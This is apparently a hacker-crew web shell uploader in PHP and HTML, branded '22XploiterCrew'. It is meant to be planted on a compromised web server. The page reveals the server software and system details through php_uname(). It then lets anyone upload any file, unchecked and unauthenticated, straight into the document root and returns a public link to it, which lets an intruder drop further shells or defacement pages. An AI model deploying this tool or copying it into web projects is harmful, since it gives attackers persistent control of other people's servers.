<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
<meta charset="utf-8">
<meta name="author" content="CodeXploit">
<meta name="description" content="Uploader">
<meta name="theme-color" content="#000">
<meta name="keywords" content="Mini Uploader">
<meta name="viewport" content="width=device-width, initial-scale=0.65, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="icon" href="https://cdn.pixabay.com/photo/2012/05/07/02/49/pirate-47705_960_720.png" type="image/jpg">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
    <title></title>
    <style>
    	h2{
    		font-family: "Rock Salt";
    	}
    	body{
    		background-color: black;
    		color: white;
    	}
    </style>
  </head>
  <body>
  
  <div class="container p-3 mt-3">
  	<h2 class="text-center">22XploiterCrew</h2>
  	<hr>
  	<center>
  	<small class="mt-2"><?= $_SERVER["SERVER_SOFTWARE"]; ?></small>
  	<br>
  	<small class=""><?= php_uname(); ?></small>
  	<hr>
  		<form method="post" class="vas-validated" enctype="multipart/form-data">
  		<div class="row">
  			<div class="col">
  			<input id="uploadFile" placeholder="Nama File" disabled="disabled" class="form-control bg-transparent text-light" id="look">
  				</div>
  				<div class="col">
  		<div class="input-group">
  <div class="custom-file">
    <input type="file" class="custom-file-input bg-transparent" id="uploadBtn" name="upl_file">
    <label class="custom-file-label bg-transparent" for="uploadFile"></label>
  </div>
 </div>
</div>
<div class="container">
    <button class="btn btn-outline-secondary btn-block mt-2 text-light" type="submit" name="upload">Upload</button>
  		</form>
  </div>
<script type="text/javascript">
	document.getElementById("uploadBtn").onchange = function(){
		document.getElementById("uploadFile").value = this.value;
};
</script>
</center>
  </body>
</html>
<?php
	$server_web = $_SERVER["DOCUMENT_ROOT"];
	$nama_file  = $_FILES["upl_file"]["name"];
	$tmp_upload = $server_web.'/'.$nama_file;
	$ekst_file  = pathinfo($nama_file, PATHINFO_EXTENSION);
	$akses_file = 'http://'.$_SERVER["HTTP_HOST"].'/';
// Validasi
	if(isset($_POST["upload"])){
		if(is_writable($server_web)){
			if(@copy($_FILES["upl_file"]["tmp_name"],$tmp_upload)){
				echo '<hr><h4 class="text-center">Berhasil Upload</h4>
					<li><small>Nama File : '.$nama_file.'</small></li>
					<li><small>Lokasi Upload : '.$tmp_upload.'</small></li>
					<li><small>Jenis File : '.$ekst_file.'</small></li>
					<li><small>Ukuran File : '.filesize($nama_file).'.KB</small></li>
					<li><small>Akses File : <a href="'.$akses_file.'/'.$nama_file.'" target="_blank">'.$akses_file.'/'.$nama_file.'</a></small></li>';
			}else{
				echo '<hr><h4 class="text-center">Gagal Upload</h4>
					<li><small>Nama File : '.$nama_file.'</small></li>
					<li><small>Lokasi Upload : '.$tmp_upload.'</small></li>
					<li><small>Jenis File : '.$ekst_file.'</small></li>
					<li><small>Ukuran File : '.filesize($nama_file).'.KB</small></li></div>';
			}
		}
	}
?>